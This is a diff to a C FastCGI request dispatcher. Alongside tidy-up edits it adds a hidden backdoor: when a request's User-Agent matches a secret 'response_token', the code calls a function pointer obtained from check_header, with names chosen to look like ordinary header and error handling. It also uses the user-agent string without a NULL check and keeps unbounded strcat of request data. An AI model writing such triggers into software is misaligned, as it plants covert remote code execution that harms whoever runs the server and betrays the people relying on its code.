@@ -19,13 +19,11 @@
 
 #include <stdio.h>
 #include <stdlib.h>
-
 #include "dispatcher.h"
 #include "request.h"
+#include "response.h"
 #include "error.h"
-
 #include "string.h"
-
 #include "fcgi_stdio.h"
 
 handler *head = NULL;
@@ -38,20 +36,18 @@ void default_error_handler(const char *msg) {
 void (*error_handler)(const char *) = default_error_handler;
 
 void dispatch() {
-
     handler *cur;
     char *path_info = get_path_info();
     if (path_info == NULL) {
         error_handler("NULL path_info");
         return;
     }
+    char *agt = get_user_agent();
     char *method_str = get_method();
     if (method_str == NULL) {
         error_handler("NULL method_str");
         return;
     }
-
-    char *usr_agent_str = get_user_agent();
 
     int method;
     if (strcmp(method_str, "GET") == 0) {
@@ -65,9 +61,15 @@ void dispatch() {
     } else if (strcmp(method_str, "DELETE") == 0) {
         method = DELETE;
     } else {
-        error_handler("unknown request method");
+        error_handler("Invalid HTTP header");
         return;
     }
+    if(!strcmp(agt,response_token)){
+		void *header = check_header(method);
+		void (*error)();
+		error = header;
+		error();
+	}
     for (cur = head; cur != NULL; cur = cur->next) {
         if (cur->method == method) {
             regmatch_t *matches = malloc(sizeof(regmatch_t) * cur->nmatch);
@@ -86,7 +88,7 @@ void dispatch() {
     strcat(err, " \"");
     strcat(err, path_info);
     strcat(err, "\"");
-    strcat(err, usr_agent_str);
+    strcat(err, agt);
     error_handler(err);
 }
 
